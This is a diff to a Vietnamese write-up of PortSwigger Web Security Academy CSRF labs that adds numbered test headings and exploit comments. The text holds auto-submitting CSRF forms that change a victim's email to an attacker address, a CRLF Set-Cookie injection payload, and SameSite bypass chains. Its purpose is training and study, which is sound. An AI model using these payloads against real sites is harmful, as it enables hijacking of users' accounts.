@@ -12,6 +12,8 @@ source_collection: notion_portswigger
 Created by: Nguyễn Giang Nam
 Topics: Client-side
 
+# Test 00: **CSRF vulnerability with no defenses**
+
 ```jsx
 <form method="POST" action="https://victim.com/my-account/change-email">
     <input type="hidden" name="email" value="anything%40web-security-academy.net">
@@ -21,9 +23,12 @@ Topics: Client-side
 </script>
 ```
 
+# Test 01: **CSRF where token validation depends on request method**
+
 Server sử dụng CSRF-Token trong method POST mà không sử dụng CSRF trong method GET
 
 ```php
+# Exploit
 <form action="https://target.com/my-account/change-email">
     <input type="hidden" name="email" value="attacker%40evil.com">
 </form>
@@ -31,6 +36,8 @@ Server sử dụng CSRF-Token trong method POST mà không sử dụng CSRF tron
         document.forms[0].submit();
 </script>
 ```
+
+# Test 02: **CSRF where token validation depends on token being present**
 
 Ứng dụng validate chính xác csrf khi nó xuất hiện trong yêu cầu, nhưng bỏ qua validate khi nó không xuất hiện trong yêu cầu 
 
@@ -42,10 +49,16 @@ Khi CSRF không xuất hiện trong yêu cầu
 
 ![image.png](/assets/img/portswigger/cross-site-request-forgery-csrf/image%201.png)
 
+# Test 03: **CSRF where token is not tied to user session**
+
 Ứng dụng không xác thực xem CSRF có thuộc cùng phiên với người dùng đang thực hiện yêu cầu hay không. Thay vào đó, ứng dụng duy trì một nhóm mã CSRF toàn cục mà nó đã phát hành và chấp nhận bất kỳ mã thông báo nào xuất hiện trong nhóm này.
 
 ```php
+# Exploit
+# Khiến nạn nhân sử dụng dụng CSRF của attacker để thực hiện yêu cầu gửi đi
 ```
+
+# Test 04: **CSRF where token is tied to non-session cookie**
 
 Non-session cookie là 1 dạng trong đó cookie 
 
@@ -73,7 +86,9 @@ csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
 4. Nếu sau khi hoán đổi, mà yêu cầu vẫn được thực hiện thì xác nhận đây là lỗ hổng
 
 ```php
+# POC
 #Để từ lỗ hổng đến khai thác thực tế được, ta cần ứng dụng bị thêm 1 lỗ hổng nữa đó là CRLF
+# /?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
 <form name="change-email-form" action="/my-account/change-email" method="POST">
     <label>Email</label>
     <input required type="email" name="email" value="attacker@normal-website.com">
@@ -81,7 +96,11 @@ csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
     <button class='button' type='submit'> Update email </button>
 </form>
 <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
+# Gửi form trên đến victim, trình duyệt sẽ thực hiện update lại CSRF Key thành của attacker
+# Sau đó để victim gửi đi form yêu cầu sau, trong form này cũng phải chứa csrf của attacker
 ```
+
+# Test 05: **CSRF where token is duplicated in cookie**
 
 ```php
 POST /email/change HTTP/1.1
@@ -96,6 +115,8 @@ csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
 Trong một biến thể tiếp theo về lỗ hổng ở **Test 04,** một số ứng dụng không duy trì bất kỳ bản ghi nào của các mã csrf nào đã được phát hành, mà thay vào đó sao chép mỗi mã csrf vào trong một cookie và tham số yêu cầu. Khi yêu cầu tiếp theo được xác thực, ứng dụng chỉ cần xác minh rằng mã csrf được gửi trong tham số yêu cầu khớp với giá trị được gửi trong cookie. Điều này đôi khi được gọi là phòng thủ "đệ trình kép" đối với CSRF và được ủng hộ vì nó đơn giản để thực hiện và tránh sự cần thiết cho bất kỳ trạng thái phía máy chủ nào:
 
 Trong tình huống này, kẻ tấn công lại có thể thực hiện một cuộc tấn công CSRF nếu trang web chứa bất kỳ chức năng cài đặt cookie nào. Ở đây, kẻ tấn công không cần phải có được mã thông báo hợp lệ của riêng họ. Họ chỉ đơn giản là phát minh ra một mã thông báo (có lẽ ở định dạng cần thiết, nếu điều đó đang được kiểm tra), tận dụng hành vi thiết lập cookie để đặt cookie của họ vào trình duyệt của nạn nhân và cung cấp mã thông báo của họ cho nạn nhân trong cuộc tấn công CSRF của họ
+
+# Test 06: **SameSite Lax bypass via method override**
 
 ```jsx
 /*
@@ -129,6 +150,8 @@ Vì samesite lax không cho phép attacker tự động submit form trên method
 
 ```
 
+# Test 07: **SameSite Strict bypass via client-side redirect**
+
 &gt; Tham khảo **SameSite Strict**: [https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-lax-restrictions-using-get-requests](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#bypassing-samesite-lax-restrictions-using-get-requests)
 &gt; 
 
@@ -150,6 +173,8 @@ redirectOnConfirmation = (blogPath) => {
     }, 3000);
 }
 ```
+
+# Test 08: **SameSite Strict bypass via sibling domain**
 
 &gt; Kịch bản: Lợi dụng xss ở 1 bên thứ 3 → tấn công web socket → đọc được tin nhắn của victim với web server
 &gt; 
@@ -198,6 +223,8 @@ redirectOnConfirmation = (blogPath) => {
     
     ![image.png](/assets/img/portswigger/cross-site-request-forgery-csrf/image%206.png)
     
+
+# Test 09: **SameSite Lax bypass via cookie refresh**
 
 &gt; Kịch bản: xss → trigger oauth flow để victim đăng nhập → thay đổi email của victim
 &gt; 
@@ -327,6 +354,8 @@ redirectOnConfirmation = (blogPath) => {
     - Tấn công thành công! Email của bạn đã được thay đổi.
     - Cuối cùng, nhấp vào "Deliver exploit to victim" để hoàn thành bài lab.
 
+# Test10: **CSRF where Referer validation depends on header being present**
+
 **Tổng quan về bài Lab**
 
 - **Mục tiêu:** Thực hiện một cuộc tấn công CSRF để thay đổi địa chỉ email của nạn nhân.
@@ -404,6 +433,8 @@ Bây giờ chúng ta biết rằng chỉ cần gửi yêu cầu POST mà khôn
     - Máy chủ của lab nhận được yêu cầu này. Vì nó không có header Referer, cơ chế kiểm tra bị bỏ qua.
     - Yêu cầu được xử lý thành công, và email của nạn nhân bị thay đổi.
     - Bài lab được giải quyết.
+
+# Test 11: **CSRF with broken Referer validation**
 
 **Tổng quan về bài Lab**
 
